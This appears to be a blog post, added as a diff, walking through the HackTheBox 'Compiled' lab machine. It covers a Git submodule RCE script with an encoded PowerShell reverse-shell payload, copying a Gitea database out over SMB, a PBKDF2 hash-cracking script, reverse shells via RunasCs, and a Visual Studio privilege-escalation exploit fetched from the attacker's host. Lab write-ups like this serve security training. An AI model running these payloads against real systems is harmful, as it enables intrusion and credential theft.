@@ -1,0 +1,311 @@
+---
+title: "HTB: Compiled"
+date: 2024-12-12
+description: "Compiled is a Windows Machine that consist of exploiting Gitea and Visual Studio 2019 to compromise the machine."
+keywords: ["HTB", "HackTheBox", "Compiled"]
+draft: false
+---
+
+## Initial Foothold
+
+As always let's run an nmap scan to search for open ports.
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ nmap -sV -sC -p- --min-rate 10000 10.129.231.87 -o nmap.result
+...
+3000/tcp open  ppp?
+...
+5000/tcp open  upnp?
+...
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+...
+```
+
+To access the web applications we will need to add `compiled.htb` to our `/etc/hosts` file.
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ cat /etc/hosts   
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.129.113.143  compiled.htb gitea.compiled.htb
+```
+
+Two web applications are running on the server on the ports `3000`and `5000`. The Gitea web application running on port `3000` is more interesting as we can register an account and potentially see open sources.
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-1.png" className="rounded-lg" />
+
+After registering an account, I found repositories from an user called for Richard and I decided to check out the history of the repositories to see if we can potentially obtain information's about our target.
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-2.png" className="rounded-lg" />
+
+Inside `README.md` document, I was able to find the following history which indicates our target is using Git version 2.45.0 which is vulnerable for remote code execution.
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-3.png" className="rounded-lg" />
+
+The exploit which the machine is vulnerable for is [CVE-2024-32002](https://github.com/amalmurali47/git_rce) and to successfully obtain a reverse shell onto the machine we will need to do this. First change the exploit code inside the  [CVE-2024-32002](https://github.com/amalmurali47/git_rce) to the following.
+
+```
+#!/bin/bash
+
+# Set Git configuration options
+git config --global protocol.file.allow always
+git config --global core.symlinks true
+# optional, but I added it to avoid the warning message
+git config --global init.defaultBranch main 
+
+
+# Define the tell-tale path
+tell_tale_path="$PWD/tell.tale"
+
+# Initialize the hook repository
+git init hook
+cd hook
+mkdir -p y/hooks
+
+# Write the malicious code to a hook
+cat > y/hooks/post-checkout <<EOF
+#!/bin/bash
+echo "amal_was_here" > /tmp/pwnd
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAxACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+EOF
+
+# Make the hook executable: important
+chmod +x y/hooks/post-checkout
+
+git add y/hooks/post-checkout
+git commit -m "post-checkout"
+
+cd ..
+
+# Define the hook repository path
+hook_repo_path="$(pwd)/hook"
+
+# Initialize the captain repository
+git init captain
+cd captain
+git submodule add --name x/y "$hook_repo_path" A/modules/x
+git commit -m "add-submodule"
+
+# Create a symlink
+printf ".git" > dotgit.txt
+git hash-object -w --stdin < dotgit.txt > dot-git.hash
+printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
+git update-index --index-info < index.info
+git commit -m "add-symlink"
+cd ..
+
+git clone --recursive captain hooked
+```
+
+Please replace the PoerShell payload with your own base64 encoded PowerShell payload. Once that is completed execute the script and it will create the following folders:
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled/git_rce]
+└─$ ls 
+captain  create_poc.sh  hook  hooked
+```
+
+Now you will need to create two repositories one called for `git_rce` and another one called for `hook`. Once that is completed upload `Hooked` files to `git_rce` repository and upload `hook` files to `hook` repository.
+
+**Overview of git_rce repository**
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-4.png" className="rounded-lg" />
+
+**Overview of hook repository**
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-5.png" className="rounded-lg" />
+
+Inside the `git_rce` repository change the `url` parameter inside `.gitmodules` file to point to your `hook` repository.
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-6.png" className="rounded-lg" />
+
+Once that is completed we can copy the `url` of `git_rce` repository and submit it to the application running on port `5000`.
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-7.png" className="rounded-lg" />
+
+Now we successfully obtained a shell onto the machine as Richard.
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ rlwrap nc -lnvp 4443
+listening on [any] 4443 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.129.142.25] 52530
+
+PS C:\Users\Richard\source\cloned_repos\gpopx\.git\modules\x> whoami
+Richard
+PS C:\Users\Richard\source\cloned_repos\gpopx\.git\modules\x> 
+```
+
+## Road To User
+
+After enumerating for a while, I spotted that the Gitea application has a database which we can potentially obtain hashes from so I transferred the database file to my kali linux machine using the following commands.
+
+**Kali Linux Machine: Starting SMB Service**
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ impacket-smbserver smb . -smb2support 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+
+**Target Machine: Transfering `Gitea.db`**
+
+```
+PS C:\program files\gitea\data> copy gitea.db \\10.10.16.11\smb
+PS C:\program files\gitea\data> 
+```
+
+After analyzing the database I quickly spotted that we successfully obtained the password hash for all the different users.
+
+<img src="/assets/images/HTB-Compiled/HTB-Compiled-8.png" className="rounded-lg" />
+
+How do we crack the passwords? I was hoping that `hashcat` would be able to assist us with cracking the password. However, after multiple of unsuccessful attempt I decided to create a python script which hashes the rockyou.txt passwords in pbkdf2_hmac algorithm and compares it to password hash of Emily. 
+
+```python
+import hashlib
+import binascii
+
+def pbkdf2_hash(password, salt, iterations, digest):
+    hashed_password = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations, digest)
+    hashed_password = binascii.hexlify(hashed_password).decode()
+    return hashed_password
+
+def main():
+    main_password_hash = input("Enter Password Hash: ")
+    main_salt = binascii.unhexlify(str(input("Enter salt: ")))
+    main_iterations = int(input("Enter iterations: "))
+    main_digest = int(input("Enter digest: "))
+
+    with open ('/usr/share/wordlists/rockyou.txt', 'r') as file:
+        for line in file:
+            hashed_password = pbkdf2_hash(line.strip(), main_salt, main_iterations, main_digest)
+
+            if hashed_password == main_password_hash:
+                print("Password cracked: " + line)
+                return 0
+            else:
+                print("Password: " + line + " Hash: " + hashed_password)
+
+main()
+```
+
+After inputting all the information's about the password hash of Emily, I was successfully able to obtain the credentials of her.
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ /bin/python /home/kali/HTB/Compiled/main.py
+Enter Password Hash: 97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16
+Enter salt: 227d873cca89103cd83a976bdac52486
+Enter iterations: 50000
+Enter digest: 50
+
+Password cracked: 12345678
+```
+
+To login as Emily, we will need to transfer [RunasCs](https://github.com/antonioCoco/RunasCs) file over to the target machine and execute the following command to create a reverse shell as Emily.
+
+**Target Machine: Executing RunasCs**
+
+```
+PS C:\users\richard\downloads> ./RunasCs.exe emily 12345678 powershell -r 10.10.16.11:4444
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-43b48b5$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1440 created in background.
+```
+
+**Kali Linux Machine: Running netcat listener**
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.129.142.25] 52547
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Windows\system32> whoami
+whoami
+compiled\emily
+PS C:\Windows\system32> cat c:\users\emily\desktop\user.txt
+cat c:\users\emily\desktop\user.txt
+[USER_FLAG]
+```
+
+We successfully managed to obtain the user flag as Emily!
+
+## Road To Root
+
+The machine has Visual Studio 2019 installed and after searching through local privilege escalation for the application I came through this article  [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) and it goes through the local privilege escalation Visual Studio 2019 is vulnerable for. The exploit could be found on [GitHub](https://github.com/Wh04m1001/CVE-2024-20656?tab=readme-ov-file). I cloned the project onto my Windows VM and changed the following code inside `main.cpp`.
+
+```cpp
+
+WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
+
+void cb1()
+{
+...
+    CopyFile(L"c:\\Temp\\shell.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
+...
+}
+```
+
+Basically, it replaces the `MofCompiler.exe` file with our `shell.exe` file which can be created using `msfvenom`. It's important to note that you will need to compile the exploit in release mode. After compiling the exploit I transferred it into the target machine.
+
+**Target Machine: Transfering `Expl.exe`**
+
+```
+PS C:\Temp>whoami
+whoami
+compiled\emily
+
+PS C:\Temp> Invoke-Webrequest -Uri http://10.10.16.11/shell.exe -o shell.exe
+PS C:\Temp> Invoke-Webrequest -Uri http://10.10.16.11/Expl.exe -o Expl.exe
+PS C:\Temp> Invoke-Webrequest -Uri http://10.10.16.11/Expl.exe -o RunasCs.exe
+PS C:\Temp> ./RunasCs.exe emily 12345678 "C:\Temp\Expl.exe"
+./RunasCs.exe emily 12345678 "C:\Temp\Expl.exe"
+
+[+] Junction \\?\C:\8bff23b8-673d-4855-983a-76d7b02fff94 -> \??\C:\253f9e47-cc6d-44ab-9189-276e4ed03adb created!
+[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
+[+] Junction \\?\C:\8bff23b8-673d-4855-983a-76d7b02fff94 -> \RPC Control created!
+[+] Junction \\?\C:\8bff23b8-673d-4855-983a-76d7b02fff94 -> \??\C:\253f9e47-cc6d-44ab-9189-276e4ed03adb created!
+[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
+[+] Junction \\?\C:\8bff23b8-673d-4855-983a-76d7b02fff94 -> \RPC Control created!
+[+] Persmissions successfully reseted!
+[*] Starting WMI installer.
+[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
+[*] Oplock!
+[+] File moved!
+```
+
+**Kali Linux: Netcat Listener**
+
+```
+┌──(kali㉿kali)-[~/HTB/Compiled]
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.129.113.143] 64709
+Microsoft Windows [Versi�n 10.0.19045.4651]
+(c) Microsoft Corporation. Todos los derechos reservados.
+
+C:\ProgramData\Microsoft\VisualStudio\SetupWMI>whoami
+nt authority\system
+
+C:\ProgramData\Microsoft\VisualStudio\SetupWMI>more c:\users\administrator\desktop\root.txt
+[ROOT FLAG]
+```
+
+We successfully managed to obtain root flag on the machine by exploiting the vulnerability with Visual Studio 2019. If you're unable to obtain the flag I recommend resetting the machine and trying the exploitation again.
